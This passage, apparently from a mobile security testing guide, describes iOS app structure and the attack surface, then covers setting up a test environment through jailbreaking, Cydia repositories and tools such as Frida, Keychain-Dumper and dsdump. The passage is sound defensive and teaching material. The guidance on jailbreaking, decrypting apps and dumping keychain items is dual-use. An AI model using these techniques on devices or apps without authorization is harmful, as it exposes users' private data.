software development. iOS applications are developed in Objective-C or
Swift.

Objective-C is an object-oriented programming language that adds
Smalltalk-style messaging to the C programming language. It is used on
macOS to develop desktop applications and on iOS to develop mobile
applications. Swift is the successor of Objective-C and allows
interoperability with Objective-C.

Swift was introduced with Xcode 6 in 2014.

On a non-jailbroken device, there are two ways to install an application
out of the App Store:

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  via Enterprise Mobile Device Management. This requires a company-wide
  certificate signed by Apple.
\item
  via sideloading, i.e., by signing an app with a developer's
  certificate and installing it on the device via Xcode (or Cydia
  Impactor). A limited number of devices can be installed to with the
  same certificate.
\end{enumerate}

\hypertarget{apps-on-ios}{%
\subsubsection{Apps on iOS}\label{apps-on-ios}}

iOS apps are distributed in IPA (iOS App Store Package) archives. The
IPA file is a ZIP-compressed archive that contains all the code and
resources required to execute the app.

IPA files have a built-in directory structure. The example below shows
this structure at a high level:

\begin{itemize}
\tightlist
\item
  \texttt{/Payload/} folder contains all the application data. We will
  come back to the contents of this folder in more detail.
\item
  \texttt{/Payload/Application.app} contains the application data itself
  (ARM-compiled code) and associated static resources.
\item
  \texttt{/iTunesArtwork} is a 512x512 pixel PNG image used as the
  application's icon.
\item
  \texttt{/iTunesMetadata.plist} contains various bits of information,
  including the developer's name and ID, the bundle identifier,
  copyright information, genre, the name of the app, release date,
  purchase date, etc.
\item
  \texttt{/WatchKitSupport/WK} is an example of an extension bundle.
  This specific bundle contains the extension delegate and the
  controllers for managing the interfaces and responding to user
  interactions on an Apple Watch.
\end{itemize}

\hypertarget{ipa-payloads---a-closer-look}{%
\paragraph{IPA Payloads - A Closer
Look}\label{ipa-payloads---a-closer-look}}

Let's take a closer look at the different files in the IPA container.
Apple uses a relatively flat structure with few extraneous directories
to save disk space and simplify file access. The top-level bundle
directory contains the application's executable file and all the
resources the application uses (for example, the application icon, other
images, and localized content .

\begin{itemize}
\tightlist
\item
  \textbf{MyApp}: The executable file containing the compiled
  (unreadable) application source code.
\item
  \textbf{Application}: Application icons.
\item
  \textbf{Info.plist}: Configuration information, such as bundle ID,
  version number, and application display name.
\item
  \textbf{Launch images}: Images showing the initial application
  interface in a specific orientation. The system uses one of the
  provided launch images as a temporary background until the application
  is fully loaded.
\item
  \textbf{MainWindow.nib}: Default interface objects that are loaded
  when the application is launched. Other interface objects are then
  either loaded from other nib files or created programmatically by the
  application.
\item
  \textbf{Settings.bundle}: Application-specific preferences to be
  displayed in the Settings app.
\item
  \textbf{Custom resource files}: Non-localized resources are placed in
  the top-level directory and localized resources are placed in
  language-specific subdirectories of the application bundle. Resources
  include nib files, images, sound files, configuration files, strings
  files, and any other custom data files the application uses.
\end{itemize}

A language.lproj folder exists for each language that the application
supports. It contains a storyboard and strings file.

\begin{itemize}
\tightlist
\item
  A storyboard is a visual representation of the iOS application's user
  interface. It shows screens and the connections between those screens.
\item
  The strings file format consists of one or more key-value pairs and
  optional comments.
\end{itemize}

\begin{figure}
\centering
\includegraphics[width=5.20833in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/fa9295f5a7912d06f00eca6564a177c1bf1338c5.png}
\caption{iOS App Folder Structure}
\end{figure}

On a jailbroken device, you can recover the IPA for an installed iOS app
using different tools that allow decrypting the main app binary and
reconstruct the IPA file. Similarly, on a jailbroken device you can
install the IPA file with
\href{https://github.com/autopear/ipainstaller}{IPA Installer}. During
mobile security assessments, developers often give you the IPA directly.
They can send you the actual file or provide access to the
development-specific distribution platform they use, e.g.,
\href{https://hockeyapp.net/}{HockeyApp} or
\href{https://developer.apple.com/testflight/}{TestFlight}.

\hypertarget{app-permissions}{%
\paragraph{App Permissions}\label{app-permissions}}

In contrast to Android apps (before Android 6.0 (API level 23)), iOS
apps don't have pre-assigned permissions. Instead, the user is asked to
grant permission during runtime, when the app attempts to use a
sensitive API for the first time. Apps that have been granted
permissions are listed in the Settings \textgreater{} Privacy menu,
allowing the user to modify the app-specific setting. Apple calls this
permission concept
\href{https://support.apple.com/en-sg/HT203033}{privacy controls}.

iOS developers can't set requested permissions directly --- they
indirectly request them with sensitive APIs. For example, when accessing
a user's contacts, any call to CNContactStore blocks the app while the
user is being asked to grant or deny access. Starting with iOS 10.0,
apps must include usage description keys for the types of permissions
they request and data they need to access (e.g.,
NSContactsUsageDescription).

The following APIs
\href{https://www.apple.com/business/docs/iOS_Security_Guide.pdf}{require
user permission}:

\begin{itemize}
\tightlist
\item
  Contacts
\item
  Microphone
\item
  Calendars
\item
  Camera
\item
  Reminders
\item
  HomeKit
\item
  Photos
\item
  Health
\item
  Motion activity and fitness
\item
  Speech recognition
\item
  Location Services
\item
  Bluetooth sharing
\item
  Media Library
\item
  Social media accounts
\end{itemize}

\hypertarget{ios-application-attack-surface}{%
\subsubsection{iOS Application Attack
surface}\label{ios-application-attack-surface}}

The iOS application attack surface consists of all components of the
application, including the supportive material necessary to release the
app and to support its functioning. The iOS application may be
vulnerable to attack if it does not:

\begin{itemize}
\tightlist
\item
  Validate all input by means of IPC communication or URL schemes, see
  also:

  \begin{itemize}
  \tightlist
  \item
    \href{0x06h-Testing-Platform-Interaction.md\#testing-custom-url-schemes-mstg-platform-3}{Testing
    Custom URL Schemes}
  \end{itemize}
\item
  Validate all input by the user in input fields.
\item
  Validate the content loaded inside a WebView, see also:

  \begin{itemize}
  \tightlist
  \item
    \href{0x06h-Testing-Platform-Interaction.md\#testing-ios-webviews-mstg-platform-5}{Testing
    iOS WebViews}
  \item
    \href{0x06h-Testing-Platform-Interaction.md\#determining-whether-native-methods-are-exposed-through-webviews-mstg-platform-7}{Determining
    Whether Native Methods Are Exposed Through WebViews}
  \end{itemize}
\item
  Securely communicate with backend servers or is susceptible to
  man-in-the-middle (MITM) attacks between the server and the mobile
  application, see also:

  \begin{itemize}
  \tightlist
  \item
    \href{0x04f-Testing-Network-Communication.md\#testing-network-communication}{Testing
    Network Communication}
  \item
    \href{0x06g-Testing-Network-Communication.md\#ios-network-apis}{iOS
    Network APIs}
  \end{itemize}
\item
  Securely stores all local data, or loads untrusted data from storage,
  see also:

  \begin{itemize}
  \tightlist
  \item
    \href{0x06d-Testing-Data-Storage.md\#data-storage-on-ios}{Data
    Storage on iOS}
  \end{itemize}
\item
  Protect itself against compromised environments, repackaging or other
  local attacks, see also:

  \begin{itemize}
  \tightlist
  \item
    \href{0x06j-Testing-Resiliency-Against-Reverse-Engineering.md\#ios-anti-reversing-defenses}{iOS
    Anti-Reversing Defenses}
  \end{itemize}
\end{itemize}

\hypertarget{ios-basic-security-testing}{%
\subsection{iOS Basic Security
Testing}\label{ios-basic-security-testing}}

In the previous chapter, we provided an overview of the iOS platform and
described the structure of iOS apps. In this chapter, we'll introduce
basic processes and techniques you can use to test iOS apps for security
flaws. These basic processes are the foundation for the test cases
outlined in the following chapters.

\hypertarget{ios-testing-setup}{%
\subsubsection{iOS Testing Setup}\label{ios-testing-setup}}

\hypertarget{host-device-1}{%
\paragraph{Host Device}\label{host-device-1}}

Although you can use a Linux or Windows machine for testing, you'll find
that many tasks are difficult or impossible on these platforms. In
addition, the Xcode development environment and the iOS SDK are only
available for macOS. This means that you'll definitely want to work on
macOS for source code analysis and debugging (it also makes black box
testing easier).

The following is the most basic iOS app testing setup:

\begin{itemize}
\tightlist
\item
  Ideally macOS machine with admin rights.
\item
  Wi-Fi network that permits client-to-client traffic.
\item
  At least one jailbroken iOS device (of the desired iOS version).
\item
  Burp Suite or other interception proxy tool.
\end{itemize}

\hypertarget{setting-up-xcode-and-command-line-tools}{%
\subparagraph{Setting up Xcode and Command Line
Tools}\label{setting-up-xcode-and-command-line-tools}}

Xcode is an Integrated Development Environment (IDE) for macOS that
contains a suite of tools for developing software for macOS, iOS,
watchOS, and tvOS. You can
\href{https://developer.apple.com/xcode/ide/}{download Xcode for free
from the official Apple website}. Xcode will offer you different tools
and functions to interact with an iOS device that can be helpful during
a penetration test, such as analyzing logs or sideloading of apps.

All development tools are already included within Xcode, but they are
not available within your terminal. In order to make them available
systemwide, it is recommended to install the Command Line Tools package.
This will be handy during testing of iOS apps as some of the tools you
will be using later (e.g.~objection) are also relying on the
availability of this package. You can
\href{https://developer.apple.com/download/more/}{download it from the
official Apple website} or install it straight away from your terminal:

\begin{verbatim}
$ xcode-select --install
\end{verbatim}

\hypertarget{testing-device-1}{%
\paragraph{Testing Device}\label{testing-device-1}}

\hypertarget{getting-the-udid-of-an-ios-device}{%
\subparagraph{Getting the UDID of an iOS
device}\label{getting-the-udid-of-an-ios-device}}

The UDID is a 40-digit unique sequence of letters and numbers to
identify an iOS device. You can find the UDID of your iOS device on
macOS Catalina onwards in the Finder app, as iTunes is not available
anymore in Catalina. Just select the connected iOS device in Finder and
click on the information under the name of the iOS device to iterate
through it. Besides the UDID, you can find the serial number, IMEI and
other useful information.

\begin{figure}
\centering
\includegraphics[width=5.20833in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/cf54b9aca2296ed3eaa6ecf814484f24668e5af6.png}
\caption{UDID in Finder}
\end{figure}

If you are using a macOS version before Catalina, you can find the
\href{http://www.iclarified.com/52179/how-to-find-your-iphones-udid}{UDID
of your iOS device via iTunes}, by selecting your device and clicking on
``Serial Number'' in the summary tab. When clicking on this you will
iterate through different metadata of the iOS device including its UDID.

It is also possible to get the UDID via various command line tools on
macOS while the device is attached via USB:

\begin{itemize}
\item
  By using the
  \href{https://developer.apple.com/library/archive/documentation/DeviceDrivers/Conceptual/IOKitFundamentals/TheRegistry/TheRegistry.html}{I/O
  Registry Explorer} tool \texttt{ioreg}:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{$ }\ExtensionTok{ioreg}\NormalTok{ {-}p IOUSB {-}l }\KeywordTok{|} \FunctionTok{grep} \StringTok{"USB Serial"}
\KeywordTok{|}         \StringTok{"USB Serial Number"}\NormalTok{ = }\StringTok{"9e8ada44246cee813e2f8c1407520bf2f84849ec"}
\end{Highlighting}
\end{Shaded}
\item
  By using
  \href{https://github.com/libimobiledevice/ideviceinstaller}{ideviceinstaller}
  (also available on Linux):

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{$ }\ExtensionTok{brew}\NormalTok{ install ideviceinstaller}
\NormalTok{$ }\ExtensionTok{idevice\_id}\NormalTok{ {-}l}
\ExtensionTok{316f01bd160932d2bf2f95f1f142bc29b1c62dbc}
\end{Highlighting}
\end{Shaded}
\item
  By using the system\_profiler:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{$ }\ExtensionTok{system\_profiler}\NormalTok{ SPUSBDataType }\KeywordTok{|} \FunctionTok{sed}\NormalTok{ {-}n {-}e }\StringTok{\textquotesingle{}/iPad/,/Serial/p;/iPhone/,/Serial/p;/iPod/,/Serial/p\textquotesingle{}} \KeywordTok{|} \FunctionTok{grep} \StringTok{"Serial Number:"}
\ExtensionTok{2019{-}09{-}08}\NormalTok{ 10:18:03.920 system\_profiler[13251:1050356] SPUSBDevice: IOCreatePlugInInterfaceForService failed 0xe00002be}
            \ExtensionTok{Serial}\NormalTok{ Number: 64655621de6ef5e56a874d63f1e1bdd14f7103b1}
\end{Highlighting}
\end{Shaded}
\item
  By using instruments:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{$ }\ExtensionTok{instruments}\NormalTok{ {-}s devices}
\end{Highlighting}
\end{Shaded}
\end{itemize}

\hypertarget{testing-on-a-real-device-jailbroken}{%
\subparagraph{Testing on a real device
(Jailbroken)}\label{testing-on-a-real-device-jailbroken}}

You should have a jailbroken iPhone or iPad for running tests. These
devices allow root access and tool installation, making the security
testing process more straightforward. If you don't have access to a
jailbroken device, you can apply the workarounds described later in this
chapter, but be prepared for a more difficult experience.

\hypertarget{testing-on-the-ios-simulator}{%
\subparagraph{Testing on the iOS
Simulator}\label{testing-on-the-ios-simulator}}

Unlike the Android emulator, which fully emulates the hardware of an
actual Android device, the iOS SDK simulator offers a higher-level
\emph{simulation} of an iOS device. Most importantly, emulator binaries
are compiled to x86 code instead of ARM code. Apps compiled for a real
device don't run, making the simulator useless for black box analysis
and reverse engineering.

\hypertarget{testing-on-an-emulator-1}{%
\subparagraph{Testing on an Emulator}\label{testing-on-an-emulator-1}}

Corellium is the only publicly available iOS emulator. It is an
enterprise SaaS solution with a per user license model and does not
offer any trial license.

\hypertarget{getting-privileged-access-1}{%
\subparagraph{Getting Privileged
Access}\label{getting-privileged-access-1}}

iOS jailbreaking is often compared to Android rooting, but the process
is actually quite different. To explain the difference, we'll first
review the concepts of ``rooting'' and ``flashing'' on Android.

\begin{itemize}
\tightlist
\item
  \textbf{Rooting}: This typically involves installing the \texttt{su}
  binary on the system or replacing the whole system with a rooted
  custom ROM. Exploits aren't required to obtain root access as long as
  the bootloader is accessible.
\item
  \textbf{Flashing custom ROMs}: This allows you to replace the OS
  that's running on the device after you unlock the bootloader. The
  bootloader may require an exploit to unlock it.
\end{itemize}

On iOS devices, flashing a custom ROM is impossible because the iOS
bootloader only allows Apple-signed images to be booted and flashed.
This is why even official iOS images can't be installed if they aren't
signed by Apple, and it makes iOS downgrades only possible for as long
as the previous iOS version is still signed.

The purpose of jailbreaking is to disable iOS protections (Apple's code
signing mechanisms in particular) so that arbitrary unsigned code can
run on the device. The word ``jailbreak'' is a colloquial reference to
all-in-one tools that automate the disabling process.

Cydia is an alternative app store developed by Jay Freeman (aka
``saurik'') for jailbroken devices. It provides a graphical user
interface and a version of the Advanced Packaging Tool (APT). You can
easily access many ``unsanctioned'' app packages through Cydia. Most
jailbreaks install Cydia automatically.

Since iOS 11 jailbreaks are introducing
\href{https://cydia-app.com/sileo/}{Sileo}, which is a new jailbreak
app-store for iOS devices. The jailbreak
\href{https://chimera.sh/}{Chimera} for iOS 12 is also relying on Sileo
as a package manager.

Developing a jailbreak for a given version of iOS is not easy. As a
security tester, you'll most likely want to use publicly available
jailbreak tools. Still, we recommend studying the techniques that have
been used to jailbreak various versions of iOS-you'll encounter many
interesting exploits and learn a lot about OS internals. For example,
Pangu9 for iOS 9.x
\href{https://www.theiphonewiki.com/wiki/Jailbreak_Exploits}{exploited
at least five vulnerabilities}, including a use-after-free kernel bug
(CVE-2015-6794) and an arbitrary file system access vulnerability in the
Photos app (CVE-2015-7037).

Some apps attempt to detect whether the iOS device on which they're
running is jailbroken. This is because jailbreaking deactivates some of
iOS' default security mechanisms. However, there are several ways to get
around these detections, and we'll introduce them in the chapters
``Reverse Engineering and Tampering on iOS'' and ``Testing
Anti-Reversing Defenses on iOS''.

Benefits of Jailbreaking

End users often jailbreak their devices to tweak the iOS system's
appearance, add new features, and install third-party apps from
unofficial app stores. For a security tester, however, jailbreaking an
iOS device has even more benefits. They include, but aren't limited to,
the following:

\begin{itemize}
\tightlist
\item
  Root access to the file system.
\item
  Possibility of executing applications that haven't been signed by
  Apple (which includes many security tools).
\item
  Unrestricted debugging and dynamic analysis.
\item
  Access to the Objective-C or Swift runtime.
\end{itemize}

Jailbreak Types

There are \emph{tethered}, \emph{semi-tethered}, \emph{semi-untethered},
and \emph{untethered} jailbreaks.

\begin{itemize}
\item
  Tethered jailbreaks don't persist through reboots, so re-applying
  jailbreaks requires the device to be connected (tethered) to a
  computer during every reboot. The device may not reboot at all if the
  computer is not connected.
\item
  Semi-tethered jailbreaks can't be re-applied unless the device is
  connected to a computer during reboot. The device can also boot into
  non-jailbroken mode on its own.
\item
  Semi-untethered jailbreaks allow the device to boot on its own, but
  the kernel patches (or user-land modifications) for disabling code
  signing aren't applied automatically. The user must re-jailbreak the
  device by starting an app or visiting a website (not requiring a
  connection to a computer, hence the term untethered).
\item
  Untethered jailbreaks are the most popular choice for end users
  because they need to be applied only once, after which the device will
  be permanently jailbroken.
\end{itemize}

Caveats and Considerations

Jailbreaking an iOS device is becoming more and more complicated because
Apple keeps hardening the system and patching the exploited
vulnerabilities. Jailbreaking has become a very time-sensitive procedure
because Apple stops signing these vulnerable versions relatively soon
after releasing a fix (unless the jailbreak benefits from hardware-based
vulnerabilities, such as the
\href{https://www.theiphonewiki.com/wiki/Limera1n}{limera1n exploit}
affecting the BootROM of the iPhone 4 and iPad 1). This means that you
can't downgrade to a specific iOS version once Apple stops signing the
firmware.

If you have a jailbroken device that you use for security testing, keep
it as is unless you're 100\% sure that you can re-jailbreak it after
upgrading to the latest iOS version. Consider getting one (or multiple)
spare device(s) (which will be updated with every major iOS release) and
waiting for a jailbreak to be released publicly. Apple is usually quick
to release a patch once a jailbreak has been released publicly, so you
have only a couple of days to downgrade (if it is still signed by Apple)
to the affected iOS version and apply the jailbreak.

iOS upgrades are based on a challenge-response process (generating the
so-called SHSH blobs as a result). The device will allow the OS
installation only if the response to the challenge is signed by Apple.
This is what researchers call a ``signing window'', and it is the reason
you can't simply store the OTA firmware package you downloaded and load
it onto the device whenever you want to. During minor iOS upgrades, two
versions may both be signed by Apple (the latest one, and the previous
iOS version). This is the only situation in which you can downgrade the
iOS device. You can check the current signing window and download OTA
firmware from the \href{https://ipsw.me}{IPSW Downloads website}.

Which Jailbreaking Tool to Use

Different iOS versions require different jailbreaking techniques.
\href{https://canijailbreak.com/}{Determine whether a public jailbreak
is available for your version of iOS}. Beware of fake tools and spyware,
which are often hiding behind domain names that are similar to the name
of the jailbreaking group/author.

The jailbreak Pangu 1.3.0 is available for 64-bit devices running iOS
9.0. If you have a device that's running an iOS version for which no
jailbreak is available, you can still jailbreak the device if you
downgrade or upgrade to the target \emph{jailbreakable} iOS version (via
IPSW download or the iOS update mechanism). However, this may not be
possible if the required iOS version is no longer signed by Apple.

The iOS jailbreak scene evolves so rapidly that providing up-to-date
instructions is difficult. However, we can point you to some sources
that are currently reliable.

\begin{itemize}
\tightlist
\item
  \href{https://canijailbreak.com/}{Can I Jailbreak?}
\item
  \href{https://www.theiphonewiki.com/}{The iPhone Wiki}
\item
  \href{https://www.redmondpie.com/}{Redmond Pie}
\item
  \href{https://www.reddit.com/r/jailbreak/}{Reddit Jailbreak}
\end{itemize}

\begin{quote}
Note that any modification you make to your device is at your own risk.
While jailbreaking is typically safe, things can go wrong and you may
end up bricking your device. No other party except yourself can be held
accountable for any damage.
\end{quote}

\hypertarget{recommended-tools---ios-device}{%
\paragraph{Recommended Tools - iOS
Device}\label{recommended-tools---ios-device}}

Many tools on a jailbroken device can be installed by using Cydia, which
is the unofficial AppStore for iOS devices and allows you to manage
repositories. In Cydia you should add (if not already done by default)
the following repositories by navigating to \textbf{Sources}
-\textgreater{} \textbf{Edit}, then clicking \textbf{Add} in the top
left:

\begin{itemize}
\tightlist
\item
  \url{http://apt.thebigboss.org/repofiles/cydia/}: One of the most
  popular repositories is BigBoss, which contains various packages, such
  as the BigBoss Recommended Tools package.
\item
  \url{https://cydia.akemi.ai/}: Add ``Karen's Repo'' to get the AppSync
  package.
\item
  \url{https://build.frida.re}: Install Frida by adding the repository
  to Cydia.
\item
  \url{https://repo.chariz.io}: Useful when managing your jailbreak on
  iOS 11.
\item
  \url{https://apt.bingner.com/}: Another repository, with quiet a few
  good tools, is Elucubratus, which gets installed when you install
  Cydia on iOS 12 using Unc0ver.
\item
  \url{https://coolstar.org/publicrepo/}: For Needle you should consider
  adding the Coolstar repo, to install Darwin CC Tools.
\end{itemize}

\begin{quote}
In case you are using the Sileo App Store, please keep in mind that the
Sileo Compatibility Layer shares your sources between Cydia and Sileo,
however, Cydia is unable to remove sources added in Sileo, and
\href{https://www.idownloadblog.com/2019/01/11/install-sileo-package-manager-on-unc0ver-jailbreak/}{Sileo
is unable to remove sources added in Cydia}. Keep this in mind when
you're trying to remove sources.
\end{quote}

After adding all the suggested repositories above you can install the
following useful packages from Cydia to get started:

\begin{itemize}
\tightlist
\item
  adv-cmds: Advanced command line, which includes tools such as finger,
  fingerd, last, lsvfs, md, and ps.
\item
  AppList: Allows developers to query the list of installed apps and
  provides a preference pane based on the list.
\item
  Apt: Advanced Package Tool, which you can use to manage the installed
  packages similarly to DPKG, but in a more friendly way. This allows
  you to install, uninstall, upgrade, and downgrade packages from your
  Cydia repositories. Comes from Elucubratus.
\item
  AppSync Unified: Allows you to sync and install unsigned iOS
  applications.
\item
  BigBoss Recommended Tools: Installs many useful command line tools for
  security testing including standard Unix utilities that are missing
  from iOS, including wget, unrar, less, and sqlite3 client.
\item
  class-dump: A command line tool for examining the Objective-C runtime
  information stored in Mach-O files and generating header files with
  class interfaces.
\item
  class-dump-z: A command line tool for examining the Swift runtime
  information stored in Mach-O files and generating header files with
  class interfaces. This is not available via Cydia, therefore please
  refer to
  \href{https://iosgods.com/topic/6706-how-to-install-class-dump-z-on-any-64bit-idevices-how-to-use-it/}{installation
  steps} in order to get class-dump-z running on your iOS device. Note
  that class-dump-z is not maintained and does not work well with Swift.
  It is recommended to use \protect\hyperlink{dsdump}{dsdump} instead.
\item
  Clutch: Used to decrypt an app executable.
\item
  Cycript: Is an inlining, optimizing, Cycript-to-JavaScript compiler
  and immediate-mode console environment that can be injected into
  running processes (associated to Substrate).
\item
  Cydia Substrate: A platform that makes developing third-party iOS
  add-ons easier via dynamic app manipulation or introspection.
\item
  cURL: Is a well known http client which you can use to download
  packages faster to your device. This can be a great help when you need
  to install different versions of Frida-server on your device for
  instance.
\item
  Darwin CC Tools: Install the Darwin CC Tools from the Coolstar repo as
  a dependency for Needle.
\item
  IPA Installer Console: Tool for installing IPA application packages
  from the command line. After installing two commands will be available
  \texttt{installipa} and \texttt{ipainstaller} which are both the same.
\item
  Frida: An app you can use for dynamic instrumentation. Please note
  that Frida has changed its implementation of its APIs over time, which
  means that some scripts might only work with specific versions of the
  Frida-server (which forces you to update/downgrade the version also on
  macOS). Running Frida Server installed via APT or Cydia is
  recommended. Upgrading/downgrading afterwards can be done, by
  following the instructions of
  \href{https://github.com/AloneMonkey/frida-ios-dump/issues/65\#issuecomment-490790602}{this
  Github issue}.
\item
  Grep: Handy tool to filter lines.
\item
  Gzip: A well known ZIP utility.
\item
  Needle-Agent: This agent is part of the Needle framework and need to
  be installed on the iOS device.
\item
  Open for iOS 11: Tool required to make Needle Agent function.
\item
  PreferenceLoader: A Substrate-based utility that allows developers to
  add entries to the Settings application, similar to the
  SettingsBundles that App Store apps use.
\item
  SOcket CAT: a utility with which you can connect to sockets to read
  and write messages. This can come in handy if you want to trace the
  syslog on iOS 12 devices.
\end{itemize}

Besides Cydia there are several other open source tools available and
should be installed, such as
\href{https://github.com/iSECPartners/Introspy-iOS}{Introspy}.

Besides Cydia you can also ssh into your iOS device and you can install
the packages directly via apt-get, like for example adv-cmds.

\begin{verbatim}
$ apt-get update
$ apt-get install adv-cmds
\end{verbatim}

\hypertarget{small-note-on-usb-of-an-idevice}{%
\subparagraph{Small note on USB of an
iDevice}\label{small-note-on-usb-of-an-idevice}}

On an iOS device you cannot make data connections anymore after 1 hour
of being in a locked state, unless you unlock it again due to the USB
Restricted Mode, which was introduced with iOS 11.4.1

\hypertarget{recommended-tools---host-computer-1}{%
\paragraph{Recommended Tools - Host
Computer}\label{recommended-tools---host-computer-1}}

In order to analyze iOS apps, you should install the following tools on
your host computer. We'll be referring to them throughout the guide.
Please note that a great number of them will require macOS in order to
run and therefore using a macOS computer is normally the recommendation
when dealing with iOS apps.

\hypertarget{burp-suite-1}{%
\subparagraph{Burp Suite}\label{burp-suite-1}}

\href{https://portswigger.net/burp}{Burp Suite} is an interception proxy
that can be used to analyze the traffic between the app and the API it's
talking to. Please refer to the section below
``\protect\hyperlink{setting-up-an-interception-proxy}{Setting up an
Interception Proxy}'' for detailed instructions on how to set it up in
an iOS environment.

\hypertarget{frida-3}{%
\subparagraph{Frida}\label{frida-3}}

\href{https://www.frida.re}{Frida} is a free and open-source dynamic
code instrumentation toolkit that lets you execute snippets of
JavaScript into your native apps. It was already introduced in the
chapter
``\href{0x04c-Tampering-and-Reverse-Engineering.md\#frida}{Tampering and
Reverse Engineering}'' of the general testing guide. Frida is used in
several of the following sections and chapters.

Frida supports interaction with the Objective-C runtime through the
\href{https://www.frida.re/docs/javascript-api/\#objc}{ObjC API}. You'll
be able to hook and call both Objective-C and native functions inside
the process and its native libraries. Your JavaScript snippets have full
access to memory, e.g.~to read and/or write any structured data.

Here are some tasks that Frida APIs offers and are relevant or exclusive
on iOS:

\begin{itemize}
\tightlist
\item
  Instantiate Objective-C objects and call static and non-static class
  methods (\href{https://www.frida.re/docs/javascript-api/\#objc}{ObjC
  API}).
\item
  Trace Objective-C method calls and/or replace their implementations
  (\href{https://www.frida.re/docs/javascript-api/\#interceptor}{Interceptor
  API}).
\item
  Enumerate live instances of specific classes by scanning the heap
  (\href{https://www.frida.re/docs/javascript-api/\#objc}{ObjC API}).
\item
  Scan process memory for occurrences of a string
  (\href{https://www.frida.re/docs/javascript-api/\#memory}{Memory
  API}).
\item
  Intercept native function calls to run your own code at function entry
  and exit
  (\href{https://www.frida.re/docs/javascript-api/\#interceptor}{Interceptor
  API}).
\end{itemize}

Remember that on iOS, you can also benefit from the built-in tools
provided when installing Frida, which include the Frida CLI
(\texttt{frida}), \texttt{frida-ps}, \texttt{frida-ls-devices} and
\texttt{frida-trace}, to name a few.

There's a \texttt{frida-trace} feature exclusive on iOS worth
highlighting: tracing Objective-C APIs using the \texttt{-m} flag and
wildcards. For example, tracing all methods including ``HTTP'' in their
name and belonging to any class whose name starts with ``NSURL'' is as
easy as running:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{$ }\ExtensionTok{frida{-}trace}\NormalTok{ {-}U YourApp {-}m }\StringTok{"*[NSURL* *HTTP*]"}
\end{Highlighting}
\end{Shaded}

For a quick start you can go through the
\href{https://www.frida.re/docs/examples/ios/}{iOS examples}.

\hypertarget{frida-ios-dump}{%
\subparagraph{Frida-ios-dump}\label{frida-ios-dump}}

\href{https://github.com/AloneMonkey/frida-ios-dump}{Frida-ios-dump}
allows you to pull a decrypted IPA from an iOS device. Please refer to
the section \protect\hyperlink{using-frida-ios-dump}{``Using
Frida-ios-dump''} for detailed instructions on how to use it.

\hypertarget{idb}{%
\subparagraph{IDB}\label{idb}}

\href{https://www.idbtool.com}{IDB} is an open source tool to simplify
some common tasks for iOS app security assessments and research. The
\href{https://www.idbtool.com/installation/}{installation instructions
for IDB} are available in the documentation.

Once you click on the button \textbf{Connect to USB/SSH device} in IDB
and key in the SSH password in the terminal where you started IDB is
ready to go. You can now click on \textbf{Select App\ldots{}}, select
the app you want to analyze and get initial meta information of the app.
Now you are able to do binary analysis, look at the local storage and
investigate IPC.

Please keep in mind that IDB might be unstable and crash after selecting
the app.

\hypertarget{ios-deploy}{%
\subparagraph{ios-deploy}\label{ios-deploy}}

With \href{https://github.com/ios-control/ios-deploy}{ios-deploy} you
can install and debug iOS apps from the command line, without using
Xcode. It can be installed via brew on macOS:

\begin{verbatim}
$ brew install ios-deploy
\end{verbatim}

For the usage please refer to the section ``ios-deploy'' below which is
part of ``\protect\hyperlink{installing-apps}{Installing Apps}''.

\hypertarget{ifunbox}{%
\subparagraph{iFunBox}\label{ifunbox}}

\href{http://www.i-funbox.com/}{iFunBox} is a file and app management
tool that supports iOS. You can
\href{http://www.i-funbox.com/en_download.html}{download it for Windows
and macOS}.

It has several features, like app installation, access the app sandbox
without jailbreak and others.

\hypertarget{keychain-dumper}{%
\subparagraph{Keychain-Dumper}\label{keychain-dumper}}

\href{https://github.com/mechanico/Keychain-Dumper}{Keychain-dumper} is
an iOS tool to check which keychain items are available to an attacker
once an iOS device has been jailbroken. Please refer to the section
``\protect\hyperlink{keychain-dumper-jailbroken}{Keychain-dumper
(Jailbroken)}'' for detailed instructions on how to use it.

\hypertarget{dsdump}{%
\subparagraph{dsdump}\label{dsdump}}

\href{https://github.com/DerekSelander/dsdump}{dsdump} is a tool to dump
Objective-C classes and Swift type descriptors (classes, structs,
enums). It only supports Swift version 5 or higher and does not support
ARM 32-bit binaries.

The following example shows how you can dump Objective-C classes and
Swift type descriptors of an iOS application.

First verify if the app's main binary is a FAT binary containing ARM64:

\begin{verbatim}
$ otool -hv [APP_MAIN_BINARY_FILE]
Mach header
      magic cputype cpusubtype  caps    filetype ncmds sizeofcmds      flags
   MH_MAGIC     ARM         V7  0x00     EXECUTE    39       5016   NOUNDEFS DYLDLINK TWOLEVEL PIE
Mach header
      magic cputype cpusubtype  caps    filetype ncmds sizeofcmds      flags
MH_MAGIC_64   ARM64        ALL  0x00     EXECUTE    38       5728   NOUNDEFS DYLDLINK TWOLEVEL PIE
\end{verbatim}

If yes, then we specify the ``--arch'' parameter to ``arm64'', otherwise
it is not needed if the binary only contains an ARM64 binary.

\begin{verbatim}
# Dump the Objective-C classes to a temporary file
$ dsdump --objc --color --verbose=5 --arch arm64 --defined [APP_MAIN_BINARY_FILE] > /tmp/OBJC.txt

# Dump the Swift type descriptors to a temporary file if the app is implemented in Swift
$ dsdump --swift --color --verbose=5 --arch arm64 --defined [APP_MAIN_BINARY_FILE] > /tmp/SWIFT.txt
\end{verbatim}

You can find more information about the inner workings of dsdump and how
to programmatically inspect a Mach-O binary to display the compiled
Swift types and Objective-C classes in
\href{https://derekselander.github.io/dsdump/}{this article}.

\hypertarget{mobile-security-framework---mobsf}{%
\subparagraph{Mobile-Security-Framework -
MobSF}\label{mobile-security-framework---mobsf}}

\href{https://github.com/MobSF/Mobile-Security-Framework-MobSF}{MobSF}
is an automated, all-in-one mobile application pentesting framework that
also supports iOS IPA files. The easiest way of getting MobSF started is
via Docker.

\begin{verbatim}
$ docker pull opensecurity/mobile-security-framework-mobsf
$ docker run -it -p 8000:8000 opensecurity/mobile-security-framework-mobsf:latest
\end{verbatim}

Or install and start it locally on your host computer by running:

\begin{verbatim}
# Setup
git clone https://github.com/MobSF/Mobile-Security-Framework-MobSF.git
cd Mobile-Security-Framework-MobSF
./setup.sh # For Linux and Mac
setup.bat # For Windows

